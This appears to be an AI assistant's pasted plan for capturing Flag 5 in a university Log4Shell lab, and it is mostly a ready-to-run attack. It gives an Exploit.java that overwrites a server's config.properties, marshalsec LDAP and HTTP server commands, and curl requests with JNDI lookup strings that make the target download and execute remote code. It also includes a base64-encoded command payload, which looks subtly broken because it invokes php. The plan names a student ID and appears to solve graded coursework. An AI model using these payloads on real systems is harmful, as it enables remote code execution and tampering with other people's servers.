@@ -1,0 +1,103 @@
+Here's a detailed summary of what we've done so far and the next steps to get Flag 5:
+What We've Achieved So Far:
+
+We've identified that to get Flag 5, we need to:
+
+Change the topic in config.properties from "user.info" to "user.account"
+Include your GATECH_ID (904074283) as the account number in the published message
+
+
+We've created and tested Exploit.java files that attempt to overwrite the config.properties file, but we're facing challenges in successfully updating the file.
+We've confirmed that the Log4j exploit mechanism itself is working - the LDAP server is successfully redirecting to our Exploit.class file.
+We've seen in the logs that the application is publishing to "user.info" topic, and we need to redirect it to "user.account" topic.
+We've tried different paths for the config.properties file, but haven't successfully updated it yet.
+
+Next Steps to Get Flag 5:
+
+Create an improved Exploit.java file:
+
+javaCopyimport java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.Properties;
+
+public class Exploit {
+    public Exploit() {
+        try {
+            // Try multiple paths to cover all possibilities
+            String[] possiblePaths = {
+                "/opt/tomcat/webapps/ROOT/config.properties",
+                "/usr/local/tomcat/webapps/ROOT/config.properties",
+                "/usr/local/tomcat/config.properties",
+                "/opt/tomcat/config.properties",
+                "/config.properties",
+                "/usr/local/tomcat/webapps/rest/config.properties"
+            };
+            
+            // Try each path
+            for (String path : possiblePaths) {
+                File file = new File(path);
+                if (file.exists()) {
+                    System.out.println("Found config.properties at: " + path);
+                    
+                    // Read existing properties
+                    Properties props = new Properties();
+                    FileInputStream fis = new FileInputStream(file);
+                    props.load(fis);
+                    fis.close();
+                    
+                    // Print current properties
+                    System.out.println("Current properties: " + props);
+                    
+                    // Update property
+                    props.setProperty("topic.name", "user.account");
+                    
+                    // Write back
+                    FileOutputStream fos = new FileOutputStream(file);
+                    props.store(fos, null);
+                    fos.close();
+                    
+                    System.out.println("Successfully updated config.properties to use user.account");
+                    break;
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
+    public static void main(String[] args) {
+        new Exploit();
+    }
+}
+
+Compile and run the servers:
+
+Navigate to Flag5 directory: cd ~/Desktop/log4shell/Flag5
+Compile the Java file: javac Exploit.java
+Start HTTP server: python3 -m http.server 8888
+Start LDAP server (from target directory): java -cp ../marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:8888/#Exploit" 4444
+
+
+Execute the exploit:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"${jndi:ldap://172.17.0.1:4444/Exploit}", "accountNum":"904074283"}'
+
+Check if the topic was changed:
+
+Look at the logs using: tail -f ~/Desktop/log4shell/logs/cs6035.log
+Look for messages about the topic being changed or messages being published to "user.account"
+
+
+Try a follow-up request:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"user1", "accountNum":"904074283"}'
+
+If still not working, try restarting the container:
+Copy./StopContainer.sh
+./StartContainer.sh
+Then repeat steps 2-5.
+Alternative approach - if exploit still fails:
+Try directly modifying the config file by obtaining a shell on the container:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' -d '{"userName":"${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/cGhwIC1yICdzeXN0ZW0oImZpbmQgLyAtbmFtZSBcImNvbmZpZy5wcm9wZXJ0aWVzXCIgMj4vZGV2L251bGwiKTsnOw==}", "accountNum":"904074283"}'
+
+
+The key to this challenge is finding the correct path to the config.properties file and successfully updating it to change the topic name. Keep trying different paths and approaches until you manage to change the topic from "user.info" to "user.account".
